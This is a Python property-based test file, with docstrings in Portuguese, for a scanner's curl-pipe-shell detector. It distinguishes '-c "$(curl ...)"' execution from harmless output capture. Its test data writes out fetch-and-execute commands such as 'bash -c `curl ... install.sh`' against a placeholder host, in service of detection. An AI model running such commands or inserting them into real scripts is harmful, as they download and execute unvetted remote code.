"""Invariante de CLASSE (property-based) do item
`AUD0908-esteira-fp-curl-cmdsubst-captura-nao-relacionada` (auditoria FN/FP 2026-09-08):
`$(curl …)`/`` `curl …` `` só é `curl-pipe-shell` via `_CURL_CMDSUBST` quando ele É o
argumento EFETIVO do `-c` — não qualquer substituição de comando mais adiante na mesma linha.

Antes do fix, o `[^\\n]*` entre `-c` e `$(`/backtick atravessava a aspa de fechamento do
argumento do `-c` e qualquer `&&`/`;` depois dele: `sh -c "<cmd inofensivo>" && VAR=$(curl …)`
(captura para variável, sem executar o que foi baixado) disparava do mesmo jeito que
`sh -c "$(curl …)"` (onde o curl É o código que o `-c` executa) — dois comportamentos bem
diferentes tratados como o mesmo achado. A correção ataca a classe: qualquer comando inofensivo
dentro do argumento do `-c`, seguido de uma substituição de comando NÃO relacionada depois dele,
deixa de disparar; a substituição que É o argumento do `-c` continua disparando.
"""

from __future__ import annotations

from hypothesis import given
from hypothesis import strategies as st

from esteira.checks.detectors import _curl_pipe_hit

_INTERPRETES = ("sh", "bash", "zsh", "dash")
_BAIXADORES = ("curl", "wget")
_ASPAS = ('"', "'")
_COMANDOS_INOFENSIVOS = ("echo hi", "true", "date +%s", "pwd")
_SEPARADORES = ("&&", ";")


def _curl_cmdsubst(baixador: str) -> str:
    return f"$({baixador} -fsSL https://example.invalid/install.sh)"


@given(
    interprete=st.sampled_from(_INTERPRETES),
    baixador=st.sampled_from(_BAIXADORES),
    aspa=st.sampled_from(_ASPAS),
)
def test_curl_cmdsubst_e_o_argumento_do_c_sempre_dispara(
    interprete: str, baixador: str, aspa: str
) -> None:
    """TP-classe (g03): o `$(curl …)` É o argumento que o `-c` efetivamente executa — dispara."""
    linha = f"{interprete} -c {aspa}{_curl_cmdsubst(baixador)}{aspa}"
    assert _curl_pipe_hit(linha)


@given(
    interprete=st.sampled_from(_INTERPRETES),
    baixador=st.sampled_from(_BAIXADORES),
    aspa=st.sampled_from(_ASPAS),
    comando_inofensivo=st.sampled_from(_COMANDOS_INOFENSIVOS),
    separador=st.sampled_from(_SEPARADORES),
)
def test_curl_cmdsubst_depois_de_c_inofensivo_nunca_dispara(
    interprete: str,
    baixador: str,
    aspa: str,
    comando_inofensivo: str,
    separador: str,
) -> None:
    """FP-classe (g02): o `-c` executa um comando inofensivo; o `$(curl …)` que aparece depois
    do `&&`/`;` só CAPTURA a saída numa variável — não é o que o `-c` executa, e por isso nunca
    pode virar curl-pipe-shell."""
    linha = (
        f"{interprete} -c {aspa}{comando_inofensivo}{aspa} {separador} "
        f"VAR={_curl_cmdsubst(baixador)}"
    )
    assert not _curl_pipe_hit(linha)


def test_curl_cmdsubst_backtick_sem_aspas_dispara() -> None:
    """TP — forma Homebrew/oh-my-zsh sem aspas: o backtick abre direto depois do `-c`."""
    assert _curl_pipe_hit("bash -c `curl --silent https://example.invalid/install.sh`")
